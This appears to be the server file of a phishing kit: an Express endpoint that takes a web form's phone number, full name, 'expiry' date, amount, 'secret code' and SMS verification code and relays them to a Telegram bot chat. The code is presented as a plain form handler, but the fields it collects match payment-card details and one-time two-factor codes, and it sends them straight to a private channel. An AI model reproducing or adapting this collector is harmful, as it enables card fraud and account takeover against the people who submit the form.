// server.js (ESM)
import dotenv from "dotenv";
dotenv.config();
import dns from "node:dns";
dns.setDefaultResultOrder("ipv4first");

import express from "express";
import cors from "cors";

const app = express();
app.use(cors());
app.use(express.json());

function buildText(p = {}) {
  const lines = [
    "📨 Заявка с сайта:",
    p.phone && `📱 Телефон: ${p.phone}`,
    p.fio && `👤 ФИО: ${p.fio}`,
    p.requestNumber && `#️⃣ Номер заявки: ${p.requestNumber}`,
    p.expiry && `📅 Срок: ${p.expiry}`,
    p.amount && `💰 Сумма: ${p.amount}`,              // ⬅️ ДОБАВЛЕНО
    p.secretCode && `🔒 Секретный код: ${p.secretCode}`,
    p.verificationCode && `🔢 Код из SMS: ${String(p.verificationCode).trim()}`,
    p.note && `📝 Примечание: ${p.note}`,
  ].filter(Boolean);
  return lines.join("\n");
}

async function handleSend(req, res) {
  try {
    const p = req.body || {};

    // Валидации по желанию
    if (p.amount && !/^\d+(\.\d{1,2})?$/.test(String(p.amount))) {
      return res.status(400).json({ success: false, error: "Неверный формат суммы" });
    }

    const text = buildText(p);
    if (!text || text.trim() === "📨 Заявка с сайта:") {
      return res.status(400).json({ success: false, error: "Нет данных" });
    }

    const token = process.env.TG_BOT_TOKEN;
    const chatId = process.env.TG_CHAT_ID;
    if (!token || !chatId) throw new Error("Нет TG_BOT_TOKEN/TG_CHAT_ID в .env");

    const tgResp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
    const tgJson = await tgResp.json();
    if (!tgJson.ok) throw new Error(tgJson.description || "Telegram error");

    res.json({ success: true });
  } catch (e) {
    console.error("API error:", e);
    res.status(500).json({ success: false, error: "Не удалось отправить" });
  }
}

// Оба пути ведут в один обработчик
app.post("/api/send", handleSend);
app.post("/v1/send",  handleSend);

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`API on http://localhost:${PORT}`));
